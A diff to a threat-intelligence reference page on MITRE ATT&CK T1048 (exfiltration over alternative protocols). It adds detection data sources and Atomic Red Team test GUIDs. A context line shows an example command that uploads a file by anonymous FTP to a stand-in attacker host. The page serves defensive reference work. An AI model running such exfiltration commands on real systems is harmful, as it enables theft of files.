@@ -18,6 +18,12 @@ Anonymous FTP command-line example:(Citation: Palo Alto OilRig Oct 2016)
 * <code>echo PUT C:\Path\to\file.txt | ftp -A attacker_system</code>
 
 
+## Aliases
+
+```
+
+```
+
 ## Additional Attributes
 
 * Bypass: None
@@ -25,7 +31,7 @@ Anonymous FTP command-line example:(Citation: Palo Alto OilRig Oct 2016)
 * Network: True
 * Permissions: None
 * Platforms: ['Linux', 'macOS', 'Windows']
-* Remote: intentionally left blank
+* Remote: None
 * Type: attack-pattern
 * Wiki: https://attack.mitre.org/techniques/T1048
 
@@ -97,7 +103,18 @@ exfiltration/Invoke_ExfilDataToGitHub
 ## Potential Detections
 
 ```json
-
+[{'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['5156', 'Windows Firewall']},
+ {'data_source': ['Packet capture']},
+ {'data_source': ['Netflow/Enclave netflow']},
+ {'data_source': ['Network protocol analysis']},
+ {'data_source': ['User interface']},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['5156', 'Windows Firewall']},
+ {'data_source': ['Packet capture']},
+ {'data_source': ['Netflow/Enclave netflow']},
+ {'data_source': ['Network protocol analysis']},
+ {'data_source': ['User interface']}]
 ```
 
 ## Potential Queries
@@ -109,7 +126,8 @@ exfiltration/Invoke_ExfilDataToGitHub
 ## Raw Dataset
 
 ```json
-[{'Atomic Red Team Test - Exfiltration Over Alternative Protocol': {'atomic_tests': [{'description': 'Input '
+[{'Atomic Red Team Test - Exfiltration Over Alternative Protocol': {'atomic_tests': [{'auto_generated_guid': 'f6786cc8-beda-4915-a4d6-ac2f193bb988',
+                                                                                      'description': 'Input '
                                                                                                      'a '
                                                                                                      'domain '
                                                                                                      'and '
@@ -165,7 +183,8 @@ exfiltration/Invoke_ExfilDataToGitHub
                                                                                               'SSH',
                                                                                       'supported_platforms': ['macos',
                                                                                                               'linux']},
-                                                                                     {'description': 'Input '
+                                                                                     {'auto_generated_guid': '7c3cb337-35ae-4d06-bf03-3032ed2ec268',
+                                                                                      'description': 'Input '
                                                                                                      'a '
                                                                                                      'domain '
                                                                                                      'and '
@@ -237,7 +256,8 @@ exfiltration/Invoke_ExfilDataToGitHub
                                                                                               'SSH',
                                                                                       'supported_platforms': ['macos',
                                                                                                               'linux']},
-                                                                                     {'description': 'A '
+                                                                                     {'auto_generated_guid': '1d1abbd6-a3d3-4b2e-bef5-c59293f46eff',
+                                                                                      'description': 'A '
                                                                                                      'firewall '
                                                                                                      'rule '
                                                                                                      '(iptables '
@@ -344,7 +364,8 @@ exfiltration/Invoke_ExfilDataToGitHub
                                                                                               'HTTP',
                                                                                       'supported_platforms': ['macos',
                                                                                                               'linux']},
-                                                                                     {'description': 'Exfiltration '
+                                                                                     {'auto_generated_guid': 'dd4b4421-2e25-4593-90ae-7021947ad12e',
+                                                                                      'description': 'Exfiltration '
                                                                                                      'of '
                                                                                                      'specified '
                                                                                                      'file '
@@ -420,7 +441,8 @@ exfiltration/Invoke_ExfilDataToGitHub
                                                                                               '- '
                                                                                               'ICMP',
                                                                                       'supported_platforms': ['windows']},
-                                                                                     {'description': 'Exfiltration '
+                                                                                     {'auto_generated_guid': 'c403b5a4-b5fc-49f2-b181-d1c80d27db45',
+                                                                                      'description': 'Exfiltration '
                                                                                                      'of '
                                                                                                      'specified '
                                                                                                      'file '
